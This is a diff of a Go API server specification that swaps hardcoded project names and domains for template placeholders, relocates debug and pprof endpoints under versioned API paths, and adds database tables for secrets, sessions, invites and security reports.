+| Read/write cache | `/var/cache/apimgr/{internal_name}/` |
+| Read/write logs | `/var/log/apimgr/{internal_name}/` |
+| Read/write backups | `/var/lib/Backups/apimgr/{internal_name}/` or `/mnt/Backups/...` |
 | Use bound sockets | Inherited from root before privilege drop |
 | Bind ports >1024 | New sockets after privilege drop |
 | Run scheduled tasks | Backup, cleanup, SSL renewal, etc. |
@@ -8114,19 +8428,19 @@ Binary checks:
 
 ```bash
 # Binary sets these during startup as root
-chown -R weather:weather /etc/apimgr/weather/
-chown -R weather:weather /var/lib/apimgr/weather/
-chown -R weather:weather /var/cache/apimgr/weather/
-chown -R weather:weather /var/log/apimgr/weather/
+chown -R weather:weather /etc/apimgr/{internal_name}/
+chown -R weather:weather /var/lib/apimgr/{internal_name}/
+chown -R weather:weather /var/cache/apimgr/{internal_name}/
+chown -R weather:weather /var/log/apimgr/{internal_name}/
 
 # Permissions
-chmod 755 /etc/apimgr/weather/
-chmod 700 /etc/apimgr/weather/security/
-chmod 700 /etc/apimgr/weather/ssl/
-chmod 700 /etc/apimgr/weather/tor/
-chmod 755 /var/lib/apimgr/weather/
-chmod 755 /var/cache/apimgr/weather/
-chmod 755 /var/log/apimgr/weather/
+chmod 755 /etc/apimgr/{internal_name}/
+chmod 700 /etc/apimgr/{internal_name}/security/
+chmod 700 /etc/apimgr/{internal_name}/ssl/
+chmod 700 /etc/apimgr/{internal_name}/tor/
+chmod 755 /var/lib/apimgr/{internal_name}/
+chmod 755 /var/cache/apimgr/{internal_name}/
+chmod 755 /var/log/apimgr/{internal_name}/
 ```
 
 **User creation:** See PART 24 for platform-specific user creation commands (Linux `useradd`, macOS `dscl`, FreeBSD `pw`).
@@ -8209,7 +8523,7 @@ server:
 
 ### Admin Panel
 
-Port can be changed via `/admin/server/settings`, but **requires server restart** (with warning shown to user).
+Port can be changed via `/{admin_path}/server/settings`, but **requires server restart** (with warning shown to user).
 
 ### Example Structure
 
@@ -8222,14 +8536,14 @@ server:
   # Default: random unused port in 64xxx range
   port: {random}
   # Auto-detected from host
-  fqdn: {hostname}
+  fqdn: {host_name}
   # [::] = all interfaces IPv4/IPv6
   address: "[::]"
   # production or development
   mode: production
   # Admin panel path (default: admin) - see PART 17
   admin_path: admin
-  # API version prefix (default: v1) - used in /api/v1/ routes
+  # API version prefix (default: v1) - used in /api/{api_version}/ routes
   api_version: v1
 
   # Branding & SEO - see PART 16 for full details
@@ -8253,7 +8567,7 @@ server:
 
   # Admin Panel
   admin:
-    email: admin@wthr.top
+    email: admin@{fqdn}
     # Note: username, password, and token are stored in database (admins table)
     # NOT in this config file for security
 
@@ -8263,16 +8577,16 @@ server:
     # cert/key: Optional manual override paths (leave empty for auto-detection)
     # Auto-detection order:
     #   /etc/letsencrypt/live/domain/ → system manages (certbot)
-    #   /etc/letsencrypt/live/wthr.top/ → system manages (certbot)
-    #   {config_dir}/ssl/letsencrypt/wthr.top/ → app manages (auto-renew)
-    #   {config_dir}/ssl/local/wthr.top/ → user manages (no auto-renew)
+    #   /etc/letsencrypt/live/{fqdn}/ → system manages (certbot)
+    #   {config_dir}/ssl/letsencrypt/{fqdn}/ → app manages (auto-renew)
+    #   {config_dir}/ssl/local/{fqdn}/ → user manages (no auto-renew)
     cert: ""   # Manual cert path (optional)
     key: ""    # Manual key path (optional)
     min_version: "TLS1.2"  # TLS1.2, TLS1.3
 
     letsencrypt:
       enabled: false
-      email: admin@wthr.top
+      email: admin@{fqdn}
       challenge: http-01  # http-01, tls-alpn-01, dns-01
       staging: false      # Use staging server for testing
 
@@ -8401,7 +8715,7 @@ Before proceeding, confirm you understand:
 | Setting | Behavior |
 |---------|----------|
 | Logging | `info` level, minimal output |
-| Debug endpoints | **Disabled** (`/debug/*` returns 404) |
+| Debug endpoints | **Disabled** (`/api/{api_version}/debug/*`, `/api/debug/*`, `/server/debug` all return 404) |
 | pprof endpoints | **Disabled** |
 | Error messages | Generic (no stack traces) |
 | Panic recovery | Graceful (logs error, returns 500) |
@@ -8437,9 +8751,10 @@ Before proceeding, confirm you understand:
 | Setting | Behavior |
 |---------|----------|
 | **Admin authentication** | **BYPASSED** (for manual dev only - NOT for automated tests) |
-| Debug endpoints | **Enabled** (`/debug/*`) |
-| pprof endpoints | **Enabled** (`/debug/pprof/*`) |
-| expvar endpoints | **Enabled** (`/debug/vars`) |
+| Debug API endpoints | **Enabled** (`/api/{api_version}/debug/*` versioned, `/api/debug/*` current alias) |
+| Debug frontend dashboard | **Enabled** (`/server/debug` HTML, links to API endpoints) |
+| pprof endpoints | **Enabled** (`/api/{api_version}/debug/pprof/*` and `/api/debug/pprof/*`) |
+| expvar endpoints | **Enabled** (`/api/{api_version}/debug/vars` and `/api/debug/vars`) |
 | Request/response logging | Full (headers, body, timing) |
 | Database query logging | Enabled (queries, timing, rows) |
 | Cache operation logging | Enabled (hits, misses, evictions) |
@@ -8465,32 +8780,50 @@ Before proceeding, confirm you understand:
 
 **Debug endpoints are ONLY available when `--debug` flag or `DEBUG=true` is set. Otherwise returns 404.**
 
-### pprof Endpoints
+**Routing follows the standard Frontend/Backend split (see PART 14):**
+
+- **Backend (JSON/profile data)** — under `/api/...` per BE rule:
+  - Versioned: `/api/{api_version}/debug/*`
+  - Current-version alias: `/api/debug/*` (served directly, no redirect)
+- **Frontend (HTML)** — under `/server/...` per FE rule, parallel to `/server/docs/swagger`:
+  - Dashboard: `/server/debug`
+
+### Frontend Dashboard
 
 | Endpoint | Purpose |
 |----------|---------|
-| `/debug/pprof/` | Index page with all profiles |
-| `/debug/pprof/heap` | Heap memory profile |
-| `/debug/pprof/goroutine` | Goroutine stack traces |
-| `/debug/pprof/allocs` | Memory allocation profile |
-| `/debug/pprof/block` | Blocking profile |
-| `/debug/pprof/mutex` | Mutex contention profile |
-| `/debug/pprof/threadcreate` | Thread creation profile |
-| `/debug/pprof/cmdline` | Command line arguments |
-| `/debug/pprof/profile` | CPU profile (30s default) |
-| `/debug/pprof/symbol` | Symbol lookup |
-| `/debug/pprof/trace` | Execution trace |
+| `/server/debug` | HTML dashboard linking to all backend debug/pprof endpoints |
 
-### Debug API Endpoints
+### Backend pprof Endpoints
 
-| Endpoint | Method | Purpose |
+**Versioned at `/api/{api_version}/debug/pprof/*`. Current-version alias at `/api/debug/pprof/*`.**
+
+| Endpoint (versioned) | Purpose |
+|----------|---------|
+| `/api/{api_version}/debug/pprof/` | Index (JSON list of available profiles) |
+| `/api/{api_version}/debug/pprof/heap` | Heap memory profile |
+| `/api/{api_version}/debug/pprof/goroutine` | Goroutine stack traces |
+| `/api/{api_version}/debug/pprof/allocs` | Memory allocation profile |
+| `/api/{api_version}/debug/pprof/block` | Blocking profile |
+| `/api/{api_version}/debug/pprof/mutex` | Mutex contention profile |
+| `/api/{api_version}/debug/pprof/threadcreate` | Thread creation profile |
+| `/api/{api_version}/debug/pprof/cmdline` | Command line arguments |
+| `/api/{api_version}/debug/pprof/profile` | CPU profile (30s default) |
+| `/api/{api_version}/debug/pprof/symbol` | Symbol lookup |
+| `/api/{api_version}/debug/pprof/trace` | Execution trace |
+
+### Backend Debug API Endpoints
+
+**Versioned at `/api/{api_version}/debug/*`. Current-version alias at `/api/debug/*`.**
+
+| Endpoint (versioned) | Method | Purpose |
 |----------|--------|---------|
-| `/debug/vars` | GET | Runtime variables (expvar) |
-| `/debug/config` | GET | Current configuration (sanitized) |
-| `/debug/routes` | GET | All registered routes |
-| `/debug/cache` | GET | Cache statistics |
-| `/debug/db` | GET | Database statistics |
-| `/debug/scheduler` | GET | Scheduler task status |
+| `/api/{api_version}/debug/vars` | GET | Runtime variables (expvar) |
+| `/api/{api_version}/debug/config` | GET | Current configuration (sanitized) |
+| `/api/{api_version}/debug/routes` | GET | All registered routes |
+| `/api/{api_version}/debug/cache` | GET | Cache statistics |
+| `/api/{api_version}/debug/db` | GET | Database statistics |
+| `/api/{api_version}/debug/scheduler` | GET | Scheduler task status |
 
 ### Debug Implementation
 
@@ -8514,7 +8847,11 @@ func (s *Server) registerDebugRoutes(r chi.Router) {
         return
     }
 
-    r.Route("/debug", func(r chi.Router) {
+    // Backend debug routes (BE rule: under /api/...). Mount the same handler
+    // tree at both the versioned path and the unversioned current-version alias.
+    // No redirect — both paths serve directly so clients aren't forced to follow
+    // a 301/302 (see PART 14: "Unversioned API aliases — when, why, where").
+    mountDebugAPI := func(r chi.Router) {
         // pprof endpoints
         r.HandleFunc("/pprof/", pprof.Index)
         r.HandleFunc("/pprof/cmdline", pprof.Cmdline)
@@ -8539,7 +8876,12 @@ func (s *Server) registerDebugRoutes(r chi.Router) {
         r.Get("/scheduler", s.handleDebugScheduler)
         r.Get("/memory", s.handleDebugMemory)
         r.Get("/goroutines", s.handleDebugGoroutines)
-    })
+    }
+    r.Route("/api/"+s.config.APIVersion+"/debug", mountDebugAPI) // versioned
+    r.Route("/api/debug", mountDebugAPI)                         // current-version alias
+
+    // Frontend debug dashboard (FE rule: under /server/..., HTML only)
+    r.Get("/server/debug", s.handleDebugDashboard)
 }
 
 // handleDebugConfig returns sanitized configuration
@@ -8816,29 +9158,31 @@ func recordError() {
 
 ```bash
 # CPU profile (30 seconds)
-go tool pprof http://localhost:64580/debug/pprof/profile
+go tool pprof http://localhost:64580/api/debug/pprof/profile
 
 # Heap memory
-go tool pprof http://localhost:64580/debug/pprof/heap
+go tool pprof http://localhost:64580/api/debug/pprof/heap
 
 # Goroutines
-go tool pprof http://localhost:64580/debug/pprof/goroutine
+go tool pprof http://localhost:64580/api/debug/pprof/goroutine
 
 # Allocations
-go tool pprof http://localhost:64580/debug/pprof/allocs
+go tool pprof http://localhost:64580/api/debug/pprof/allocs
 
 # Blocking profile (requires runtime.SetBlockProfileRate)
-go tool pprof http://localhost:64580/debug/pprof/block
+go tool pprof http://localhost:64580/api/debug/pprof/block
 
 # Mutex contention (requires runtime.SetMutexProfileFraction)
-go tool pprof http://localhost:64580/debug/pprof/mutex
+go tool pprof http://localhost:64580/api/debug/pprof/mutex
 
-# Execution trace (download and view)
-curl -q -LSsf -o trace.out http://localhost:64580/debug/pprof/trace?seconds=5
-go tool trace trace.out
+# Execution trace (download and view) — write to tmp dir per "Output File Location Rules"
+TMP=/tmp/apimgr/{internal_name}-$$
+mkdir -p "$TMP"
+curl -q -LSsf -o "$TMP/trace.out" http://localhost:64580/api/debug/pprof/trace?seconds=5
+go tool trace "$TMP/trace.out"
 
 # WebUI for profiles
-go tool pprof -http=:8081 http://localhost:64580/debug/pprof/heap
+go tool pprof -http=:8081 http://localhost:64580/api/debug/pprof/heap
 ```
 
 ### Debug Configuration
@@ -8884,7 +9228,7 @@ import (
     "runtime"
     "strings"
 
-    "github.com/apimgr/weather/src/config"
+    "github.com/apimgr/{internal_name}/src/config"
 )
 
 var (
@@ -9052,32 +9396,37 @@ data:
 
   geoip:
     # ip-location-db (https://github.com/sapics/ip-location-db)
-    # Free, no API key required, daily updates, CC0/PDDL licensed
+    # Free, no API key required, daily updates, CC0/PDDL licensed.
+    # ASN and country packages publish a single combined v4+v6 mmdb;
+    # city is split — must download v4 and v6 separately.
     provider: "ip-location-db"
     databases:
       asn:
         enabled: true
         url: "https://cdn.jsdelivr.net/npm/@ip-location-db/asn-mmdb/asn.mmdb"
-        file: "asn.mmdb"
+        file: "asn.mmdb"          # combined IPv4+IPv6
       country:
         enabled: true
         url: "https://cdn.jsdelivr.net/npm/@ip-location-db/geo-whois-asn-country-mmdb/geo-whois-asn-country.mmdb"
-        file: "country.mmdb"
-      city:
+        file: "country.mmdb"      # combined IPv4+IPv6 (geo-whois-asn-country is the whois-derived country dataset)
+      city_ipv4:
         enabled: true
-        url: "https://cdn.jsdelivr.net/npm/@ip-location-db/dbip-city-mmdb/dbip-city-ipv4.mmdb"
-        file: "city.mmdb"
-      whois:
+        url: "https://cdn.jsdelivr.net/npm/@ip-location-db/dbip-city-mmdb/dbip-city-ipv4-num.mmdb"
+        file: "city-ipv4.mmdb"
+      city_ipv6:
         enabled: true
-        url: "https://cdn.jsdelivr.net/npm/@ip-location-db/geo-whois-asn-country-mmdb/geo-whois-asn-country.mmdb"
-        file: "whois.mmdb"
+        url: "https://cdn.jsdelivr.net/npm/@ip-location-db/dbip-city-mmdb/dbip-city-ipv6-num.mmdb"
+        file: "city-ipv6.mmdb"
+      # Note: a separate `whois` entry was previously listed but pointed at the same
+      # geo-whois-asn-country package as `country`. The country DB above already serves
+      # whois-derived data; no separate whois entry is needed.
 
   # Blocklists: stored in {data_dir}/security/blocklists/
   # Config is under server.security.blocklists (see Blocklists Section)
 
   cve:
     # NVD (NIST National Vulnerability Database)
-    source: "https://nvd.nist.gov/feeds/json/cve/1.1"
+    source: "https://services.nvd.nist.gov/rest/json/cves/2.0"   # NVD API 2.0 (legacy 1.1 JSON feeds were retired)
     # Only download CVEs relevant to project dependencies
     filter_by_cpe: true
 
@@ -9659,7 +10008,7 @@ func PrintStartupBanner(cfg BannerConfig) {
 
 **Hardcode `weather` for internal identifiers (never changes):**
 - User-Agent header (identifies binary type to server)
-- Default paths (`/etc/apimgr/weather/`)
+- Default paths (`/etc/apimgr/{internal_name}/`)
 - Config keys, database tables, API identifiers
 
 **Get actual binary name:**
@@ -9828,7 +10177,7 @@ NO_COLOR=1 weather --status | grep -E '✅|❌|⚠️|🚀'  # Should find nothi
 
 ```bash
 $ weather --help
-weather 1.0.0 - {project description}
+weather {project_version} - {project description}
 
 Usage:
   weather [flags]
@@ -9873,12 +10222,12 @@ Run 'weather <command> --help' for detailed help on any command.
 
 | Flag | Type | Default (Linux root) | Default (Linux user) |
 |------|------|----------------------|----------------------|
-| `--config` | Directory | `/etc/apimgr/weather/` | `~/.config/apimgr/weather/` |
-| `--data` | Directory | `/var/lib/apimgr/weather/` | `~/.local/share/apimgr/weather/` |
-| `--cache` | Directory | `/var/cache/apimgr/weather/` | `~/.cache/apimgr/weather/` |
-| `--log` | Directory | `/var/log/apimgr/weather/` | `~/.local/log/apimgr/weather/` |
-| `--backup` | Directory | `/mnt/Backups/apimgr/weather/` (if writable) | `~/.local/share/Backups/apimgr/weather/` |
-| `--pid` | File | `/var/run/apimgr/weather.pid` | `~/.local/share/apimgr/weather/weather.pid` |
+| `--config` | Directory | `/etc/apimgr/{internal_name}/` | `~/.config/apimgr/{internal_name}/` |
+| `--data` | Directory | `/var/lib/apimgr/{internal_name}/` | `~/.local/share/apimgr/{internal_name}/` |
+| `--cache` | Directory | `/var/cache/apimgr/{internal_name}/` | `~/.cache/apimgr/{internal_name}/` |
+| `--log` | Directory | `/var/log/apimgr/{internal_name}/` | `~/.local/log/apimgr/{internal_name}/` |
+| `--backup` | Directory | `/mnt/Backups/apimgr/{internal_name}/` (if writable) | `~/.local/share/Backups/apimgr/{internal_name}/` |
+| `--pid` | File | `/var/run/apimgr/{internal_name}.pid` | `~/.local/share/apimgr/{internal_name}/{internal_name}.pid` |
 
 **Note:** `--backup` prefers system backup dir if writable, falls back to user dir. See `GetBackupDir()` in PART 5.
 
@@ -10181,11 +10530,11 @@ PHASE 5: Server startup (actual server start)
    h. Verify privilege drop succeeded (getuid() != 0)
 
 9. IF RUNNING AS USER (non-root) - setup user directories:
-   ├─ Create {config_dir} (~/.config/apimgr/weather/)
-   ├─ Create {data_dir} (~/.local/share/apimgr/weather/)
-   ├─ Create {cache_dir} (~/.cache/apimgr/weather/)
-   ├─ Create {log_dir} (~/.local/log/apimgr/weather/)
-   ├─ Create {backup_dir} (~/.local/share/Backups/apimgr/weather/)
+   ├─ Create {config_dir} (~/.config/apimgr/{internal_name}/)
+   ├─ Create {data_dir} (~/.local/share/apimgr/{internal_name}/)
+   ├─ Create {cache_dir} (~/.cache/apimgr/{internal_name}/)
+   ├─ Create {log_dir} (~/.local/log/apimgr/{internal_name}/)
+   ├─ Create {backup_dir} (~/.local/share/Backups/apimgr/{internal_name}/)
    ├─ Set permissions: 0700 on all dirs (user-only access)
    └─ Note: port must be >1024 (user mode cannot bind privileged ports)
 
@@ -10194,7 +10543,7 @@ PHASE 5: Server startup (actual server start)
     ├─ Set default log level (info)
     └─ Log "Server starting, version X.Y.Z"
 
-11. Check PID file (root: /var/run/apimgr/weather.pid, user: {data_dir}/weather.pid):
+11. Check PID file (root: /var/run/apimgr/{internal_name}.pid, user: {data_dir}/{internal_name}.pid):
     ├─ PID file exists AND process running → exit 1 "already running"
     ├─ PID file exists AND process dead → remove stale PID, continue
     └─ No PID file → continue
@@ -11744,6 +12093,111 @@ CREATE INDEX IF NOT EXISTS idx_trusted_devices_expires ON trusted_devices(expire
 
 -- Cleanup expired trusted devices (run via scheduler)
 -- DELETE FROM trusted_devices WHERE expires_at < strftime('%s', 'now');
+
+-- ----------------------------------------------------------------------------
+-- App-Level Cryptographic Secrets (PART 11 → "Cryptographic Keys")
+-- ----------------------------------------------------------------------------
+-- Single-row-per-name; rotated values keep history rows for the grace window.
+CREATE TABLE IF NOT EXISTS app_secrets (
+    name        TEXT NOT NULL,                 -- installation_secret, cookie_signing_key, csrf_token_secret, ... (NOT server.security.encryption_key — that lives in server.yml)
+    value       BLOB NOT NULL,                 -- raw bytes (or AES-256-GCM-wrapped if `encrypted=1`)
+    encrypted   INTEGER NOT NULL DEFAULT 0,    -- 1 if value is wrapped (e.g., PGP private key encrypted with installation_secret KDF)
+    version     INTEGER NOT NULL,              -- monotonic; current row has MAX(version)
+    created_at  INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    expires_at  INTEGER,                       -- non-NULL for previous values during rotation grace window
+    PRIMARY KEY (name, version)
+);
+CREATE INDEX IF NOT EXISTS idx_app_secrets_name ON app_secrets(name);
+CREATE INDEX IF NOT EXISTS idx_app_secrets_expires ON app_secrets(expires_at);
+
+-- ----------------------------------------------------------------------------
+-- Partial Sessions (post-password, pre-2FA / pre-recovery)
+-- See PART 14 → Token Types → "Partial-session"
+-- ----------------------------------------------------------------------------
+CREATE TABLE IF NOT EXISTS partial_sessions (
+    token_hash  TEXT PRIMARY KEY,              -- SHA-256 of the partial-session cookie value
+    user_type   TEXT NOT NULL,                 -- admin, user
+    user_id     INTEGER NOT NULL,              -- FK to admins or users
+    stage       TEXT NOT NULL,                 -- awaiting_2fa, awaiting_recovery
+    created_at  INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    expires_at  INTEGER NOT NULL,              -- 5 minutes from creation by default
+    consumed    INTEGER NOT NULL DEFAULT 0
+);
+CREATE INDEX IF NOT EXISTS idx_partial_sessions_expires ON partial_sessions(expires_at);
+
+-- ----------------------------------------------------------------------------
+-- Invites (admin invite, user invite, org invite)
+-- See PART 14 → Token Types → "Invite token"
+-- ----------------------------------------------------------------------------
+CREATE TABLE IF NOT EXISTS invites (
+    id          TEXT PRIMARY KEY,              -- short id for admin display ("inv_abc123")
+    token_hash  TEXT NOT NULL UNIQUE,          -- SHA-256 of the invite token; URL has the plaintext
+    invite_type TEXT NOT NULL,                 -- server_admin, user, org_member
+    target_id   INTEGER,                       -- if user/org invite, FK to org or pre-created user row
+    created_by  INTEGER NOT NULL,              -- FK to admins or users (who sent the invite)
+    email       TEXT,                          -- email the invite was sent to (for audit)
+    created_at  INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    expires_at  INTEGER NOT NULL,              -- 7 days from creation by default
+    consumed    INTEGER NOT NULL DEFAULT 0,
+    consumed_at INTEGER
+);
+CREATE INDEX IF NOT EXISTS idx_invites_token ON invites(token_hash);
+CREATE INDEX IF NOT EXISTS idx_invites_expires ON invites(expires_at);
+
+-- ----------------------------------------------------------------------------
+-- Security Reports (PART 11 → "Security Reports — Coordinated Disclosure Pipeline")
+-- ----------------------------------------------------------------------------
+-- Encrypted report bodies live here; tracking metadata is queryable.
+CREATE TABLE IF NOT EXISTS security_reports (
+    tracking_id      TEXT PRIMARY KEY,         -- "sec_..." (PART 11 token prefix table)
+    summary          TEXT NOT NULL,            -- single-line researcher-supplied summary
+    severity         TEXT NOT NULL,            -- critical, high, medium, low, informational
+    state            TEXT NOT NULL,            -- received, triaged, confirmed, patching, disclosed, wont_fix
+    body_encrypted   BLOB NOT NULL,            -- PGP-encrypted (preferred) or AES-256-GCM-wrapped report body
+    body_encryption  TEXT NOT NULL,            -- "pgp" | "aes256gcm-fallback"
+    researcher_email TEXT NOT NULL,            -- for acknowledgment email
+    researcher_pgp   TEXT,                     -- ASCII-armored pubkey OR URL
+    credit_pref      TEXT NOT NULL,            -- real_name, handle, anonymous, no_credit
+    handle           TEXT,                     -- if credit_pref=handle
+    coordinated_until INTEGER,                 -- disclosure timeline preference, unix seconds
+    cve_requested    INTEGER NOT NULL DEFAULT 0,
+    cve_id           TEXT,                     -- e.g., "CVE-2026-12345" once assigned
+    submitted_at     INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    submitted_app_version TEXT NOT NULL,       -- captured for triage
+    submitted_commit_hash TEXT,
+    submitted_security_id TEXT NOT NULL,       -- the {security_id} that was used
+    closed_at        INTEGER                   -- non-NULL when state in (disclosed, wont_fix)
+);
+CREATE INDEX IF NOT EXISTS idx_security_reports_state ON security_reports(state);
+CREATE INDEX IF NOT EXISTS idx_security_reports_severity ON security_reports(severity);
+CREATE INDEX IF NOT EXISTS idx_security_reports_submitted ON security_reports(submitted_at);
+
+-- One-shot tokens for the researcher status page `/server/security/report/{tracking_id}`.
+CREATE TABLE IF NOT EXISTS security_report_tokens (
+    token_hash   TEXT PRIMARY KEY,             -- SHA-256(tracking_token)
+    tracking_id  TEXT NOT NULL,                -- FK to security_reports.tracking_id
+    created_at   INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    last_used_at INTEGER,                      -- for single-use-per-day enforcement
+    expires_at   INTEGER NOT NULL              -- 30d after report closes
+);
+CREATE INDEX IF NOT EXISTS idx_security_report_tokens_tracking ON security_report_tokens(tracking_id);
+CREATE INDEX IF NOT EXISTS idx_security_report_tokens_expires ON security_report_tokens(expires_at);
+
+-- ----------------------------------------------------------------------------
+-- Agent Join Tokens (PART 33 → "Agent Registration") — mirrors cluster join.
+-- ----------------------------------------------------------------------------
+CREATE TABLE IF NOT EXISTS agent_join_tokens (
+    token_hash  TEXT PRIMARY KEY,              -- SHA-256(agt_join_xxx)
+    scope       TEXT NOT NULL,                 -- admin, user, org
+    owner_id    INTEGER,                       -- FK to admins/users/orgs depending on scope (NULL for admin scope)
+    created_by  INTEGER NOT NULL,              -- FK to admins (whoever issued the token)
+    created_at  INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
+    expires_at  INTEGER NOT NULL,              -- 15 minutes from creation by default
+    consumed    INTEGER NOT NULL DEFAULT 0,    -- 1 once an agent successfully registered with it
+    consumed_at INTEGER,
+    consumed_by_agent_id TEXT                  -- the agent_id created from this token
+);
+CREATE INDEX IF NOT EXISTS idx_agent_join_tokens_expires ON agent_join_tokens(expires_at);
 ```
 
 **Example Config Data:**
@@ -11867,7 +12321,7 @@ func categorizeChanges(changes []string) (hotReload, needsRestart []string) {
 **Admin UI Restart Notification:**
 
 ```go
-// GET /admin/api/status returns pending restart info
+// GET /{admin_path}/api/status returns pending restart info
 func adminStatusHandler(w http.ResponseWriter, r *http.Request) {
     status := map[string]interface{}{
         "running":         true,
@@ -11897,7 +12351,7 @@ func adminStatusHandler(w http.ResponseWriter, r *http.Request) {
 
 ```go
 // GET /healthz - full health response (see PART 13 for JSON structure)
-// GET /api/v1/healthz - same response, always JSON
+// GET /api/{api_version}/healthz - same response, always JSON
 func healthHandler(w http.ResponseWriter, r *http.Request) {
     // Content negotiation handled by middleware (PART 14)
     // This returns the data; middleware formats as HTML/JSON/text
@@ -12074,7 +12528,7 @@ $ kill -TERM $(cat /var/run/myapp.pid)
 | (none) | `DATABASE_DIR` | SQLite database directory (Docker: `/data/db/sqlite`, Native: `{data_dir}/db/`) |
 | (none) | `BACKUP_DIR` | Backup directory (defaults to `{data_dir}/backup/`, changeable) |
 
-**External backup mounts:** In production, `BACKUP_DIR` should typically point to external storage (NAS, separate disk, etc.) rather than staying under `{data_dir}`. Example: `BACKUP_DIR=/mnt/Backups/apimgr/weather`. The default `{data_dir}/backup/` is for development/testing only.
+**External backup mounts:** In production, `BACKUP_DIR` should typically point to external storage (NAS, separate disk, etc.) rather than staying under `{data_dir}`. Example: `BACKUP_DIR=/mnt/Backups/apimgr/{internal_name}`. The default `{data_dir}/backup/` is for development/testing only.
 
 **Implementation:**
 
@@ -12159,10 +12613,10 @@ func isWritable(path string) bool {
 }
 
 // systemBackupDir returns the system-level backup directory
-// Linux: /mnt/Backups/apimgr/weather
-// macOS: /Library/Backups/apimgr/weather
-// BSD:   /var/backups/apimgr/weather
-// Windows: %ProgramData%\Backups\apimgr\weather
+// Linux: /mnt/Backups/apimgr/{internal_name}
+// macOS: /Library/Backups/apimgr/{internal_name}
+// BSD:   /var/backups/apimgr/{internal_name}
+// Windows: %ProgramData%\Backups\apimgr\{internal_name}
 func systemBackupDir() string {
     switch runtime.GOOS {
     case "darwin":
@@ -12177,9 +12631,9 @@ func systemBackupDir() string {
 }
 
 // userBackupDir returns the user-level backup directory
-// Linux/BSD: ~/.local/share/Backups/apimgr/weather
-// macOS: ~/Library/Backups/apimgr/weather
-// Windows: %LocalAppData%\Backups\apimgr\weather
+// Linux/BSD: ~/.local/share/Backups/apimgr/{internal_name}
+// macOS: ~/Library/Backups/apimgr/{internal_name}
+// Windows: %LocalAppData%\Backups\apimgr\{internal_name}
 func userBackupDir() string {
     home, _ := os.UserHomeDir()
     switch runtime.GOOS {
@@ -12206,8 +12660,8 @@ export DATABASE_DIR="/data/db"
 export BACKUP_DIR="/data/backups/${APP_NAME}"
 
 # Tor directories under binary's dirs (binary owns Tor)
-# ${CONFIG_DIR}/tor/ = /config/weather/tor/
-# ${DATA_DIR}/tor/   = /data/weather/tor/
+# ${CONFIG_DIR}/tor/ = /config/{internal_name}/tor/
+# ${DATA_DIR}/tor/   = /data/{internal_name}/tor/
 ```
 
 ### Docker Compose Mapping
@@ -12217,34 +12671,33 @@ export BACKUP_DIR="/data/backups/${APP_NAME}"
 ```yaml
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     container_name: weather-app
     command:
       - --config=/config
       - --data=/data
       - --log=/logs
-      - --pid=/run/weather.pid
-      - --port=8080
+      - --pid=/run/{internal_name}.pid
     volumes:
       - config:/config:ro          # Config (read-only)
       - data:/data                 # Data (read-write)
       - logs:/logs                 # Logs (read-write)
       - /var/run:/run:z            # PID file
     ports:
-      - "8080:8080"
+      - "64580:80"                 # host:container — container always 80 internally; host port is random+persisted (64580 shown as example)
 ```
 
-**Minimal compose (uses container defaults):**
+**Minimal compose (uses container defaults — internal 80, host port random):**
 
 ```yaml
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     container_name: weather-app
     volumes:
       - weather-data:/data
     ports:
-      - "8080:8080"
+      - "64580:80"   # host port is the random+persisted value picked at install (64580 is illustrative)
 
 volumes:
   weather-data:
@@ -12275,8 +12728,8 @@ volumes:
 |------|-------------|
 | **NEVER hardcode** | `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`, any static host/IP |
 | **NEVER display** | `GET /api/`, `POST /api/` without full URL |
-| **ALWAYS use** | `{proto}://wthr.top:{port}/path` format |
-| **ALWAYS detect** | `{proto}`, `wthr.top`, `{port}` from request context |
+| **ALWAYS use** | `{proto}://{fqdn}:{port}/path` format |
+| **ALWAYS detect** | `{proto}`, `{fqdn}`, `{port}` from request context |
 | **ALWAYS strip** | `:80` for HTTP, `:443` for HTTPS |
 | **Default proto** | `http` if not detected |
 
@@ -12284,23 +12737,23 @@ volumes:
 
 | WRONG | RIGHT |
 |-------|-------|
-| `GET /api/v1/resource/random` | `https://api.example.com/api/v1/resource/random` |
-| `POST /api/v1/admin/server/settings` | `https://api.example.com/api/v1/admin/server/settings` |
-| `http://localhost:8080/api` | `http://192.168.1.100:64580/api` |
+| `GET /api/{api_version}/resource/random` | `https://api.example.com/api/{api_version}/resource/random` |
+| `POST /api/{api_version}/{admin_path}/server/settings` | `https://api.example.com/api/{api_version}/{admin_path}/server/settings` |
+| `http://localhost:64580/api` | `http://192.168.1.100:64580/api` |
 | `http://0.0.0.0:80/healthz` | `https://myserver.example.com/healthz` |
 
 ### URL Variables
 
-**Three variables for building URLs: `{proto}`, `wthr.top`, `{port}`**
+**Three variables for building URLs: `{proto}`, `{fqdn}`, `{port}`**
 
 All templates, Swagger/OpenAPI, GraphQL, email links, etc. MUST use these resolved variables.
 
 | Variable | Description | Example |
 |----------|-------------|---------|
 | `{proto}` | Protocol (http/https) | `https` |
-| `wthr.top` | Fully qualified domain name | `api.example.com` |
-| `/` | URL path prefix (auto-detected) | `/` or `/myproject` |
-| `{port}` | Port number (ALWAYS stripped if 80/443) | `8080` or empty |
+| `{fqdn}` | Fully qualified domain name | `api.example.com` |
+| `{base_url}` | URL path prefix (auto-detected) | `/` or `/myproject` |
+| `{port}` | Port number (ALWAYS stripped if 80/443) | `64580` or empty |
 | `{address}` | Listen IP address | `203.0.113.50` |
 | `{app_mode}` | Application mode | `production` or `development` |
 | `{onion_address}` | Tor .onion address (if enabled) | `abc...xyz.onion` |
@@ -12310,7 +12763,7 @@ All templates, Swagger/OpenAPI, GraphQL, email links, etc. MUST use these resolv
 | `{startup_datetime}` | Server start timestamp | `Wed Jan 15, 2025 at 09:00:00 EST` |
 | `{setup_token}` | First-run setup token (shown ONCE) | `a1b2c3d4e5f67890abcdef1234567890` |
 
